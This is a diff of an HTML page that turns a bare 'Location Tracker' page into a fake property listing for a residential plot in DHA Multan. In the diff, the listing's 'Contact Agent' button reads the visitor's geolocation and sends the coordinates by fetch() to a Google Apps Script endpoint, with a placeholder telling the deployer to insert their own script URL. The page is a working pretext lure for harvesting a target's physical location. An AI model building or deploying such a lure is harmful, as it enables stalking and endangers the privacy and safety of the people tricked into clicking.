@@ -3,55 +3,172 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Location Tracker</title>
+    <title>DHA Multan - Premium Plot Listing</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background-color: #222; /* Dark background */
-            color: white;
-            text-align: center;
-            padding-top: 50px;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f7f6;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
         }
-        button {
-            padding: 15px 30px;
-            font-size: 20px;
-            cursor: pointer;
-            background-color: #007bff;
+
+        .card {
+            background: white;
+            width: 90%;
+            max-width: 400px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            overflow: hidden;
+            text-align: center;
+            padding-bottom: 20px;
+        }
+
+        .header-img {
+            background-color: #2c3e50;
+            height: 180px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 40px;
+        }
+
+        .content {
+            padding: 20px;
+        }
+
+        .badge {
+            background-color: #e67e22;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 4px;
+            font-size: 12px;
+            text-transform: uppercase;
+            font-weight: bold;
+            display: inline-block;
+            margin-bottom: 10px;
+        }
+
+        h1 {
+            font-size: 22px;
+            color: #333;
+            margin: 10px 0;
+        }
+
+        .price {
+            font-size: 24px;
+            color: #27ae60;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+
+        .details {
+            display: flex;
+            justify-content: space-around;
+            color: #7f8c8d;
+            font-size: 14px;
+            margin-bottom: 20px;
+            border-top: 1px solid #eee;
+            border-bottom: 1px solid #eee;
+            padding: 10px 0;
+        }
+
+        .btn {
+            background-color: #3498db;
             color: white;
             border: none;
-            border-radius: 5px;
+            padding: 12px 30px;
+            font-size: 16px;
+            border-radius: 25px;
+            cursor: pointer;
+            width: 80%;
+            transition: background 0.3s;
+        }
+
+        .btn:hover {
+            background-color: #2980b9;
+        }
+
+        .loader {
+            display: none;
+            margin-top: 15px;
+            color: #7f8c8d;
+            font-size: 14px;
+        }
+        
+        .success-msg {
+            display: none;
+            color: #27ae60;
+            font-weight: bold;
+            margin-top: 15px;
         }
     </style>
 </head>
 <body>
 
-    <h1>Welcome to My Website</h1>
-    <p>Click the button below!</p>
-    
-    <!-- This is the button -->
-    <button onclick="sendLocation()">Get Plot Information</button>
+    <div class="card">
+        <div class="header-img">
+            🏠
+        </div>
+        <div class="content">
+            <span class="badge">Premium Plot</span>
+            <h1>5 Marla Residential Plot</h1>
+            <p style="color: #666; font-size: 14px;">DHA Multan, Sector F (Main Boulevard)</p>
+            
+            <div class="price">PKR 85 Lacs</div>
+
+            <div class="details">
+                <span>📐 5 Marla</span>
+                <span>🛣️ Main Road</span>
+                <span>💳 Ready to Transfer</span>
+            </div>
+
+            <!-- This button triggers the location -->
+            <button class="btn" id="contactBtn" onclick="sendLocation()">Contact Agent</button>
+            
+            <div class="loader" id="loader">
+                📡 Sending your location to seller...
+            </div>
+            
+            <div class="success-msg" id="successMsg">
+                ✅ Location Sent! Seller will call you shortly.
+            </div>
+        </div>
+    </div>
 
     <script>
+        // REPLACE THIS URL WITH YOUR GOOGLE SCRIPT URL FROM STEP 2
+        var scriptURL = 'https://script.google.com/macros/s/YOUR_GOOGLE_SCRIPT_ID/exec'; 
+
         function sendLocation() {
-            // 1. Ask the browser for your location
+            var btn = document.getElementById('contactBtn');
+            var loader = document.getElementById('loader');
+            var success = document.getElementById('successMsg');
+
+            // UI Feedback: Disable button and show loading
+            btn.style.display = 'none';
+            loader.style.display = 'block';
+
             navigator.geolocation.getCurrentPosition(function(position) {
-                
-                // 2. Get the latitude and longitude
                 var lat = position.coords.latitude;
                 var lon = position.coords.longitude;
 
-                // 3. Create a message with the data
-                var message = "Location Sent: Latitude " + lat + ", Longitude " + lon;
-
-                // 4. Show the message on the screen (so you can see it worked)
-                alert(message);
-
-                // 5. OPTIONAL: Send this data to a server (Advanced)
-                // For now, we will just log it to the browser console.
-                console.log("Sent location:", lat, lon);
-
+                // Send data to Google Sheets
+                fetch(scriptURL + '?lat=' + lat + '&lon=' + lon)
+                    .then(response => {
+                        loader.style.display = 'none';
+                        success.style.display = 'block';
+                    })
+                    .catch(error => console.error('Error!', error.message));
+                    
             }, function(error) {
-                alert("Could not get location: " + error.message);
+                loader.style.display = 'none';
+                btn.style.display = 'inline-block'; // Show button again if failed
+                alert("Please allow location access to contact the seller.");
             });
         }
     </script>
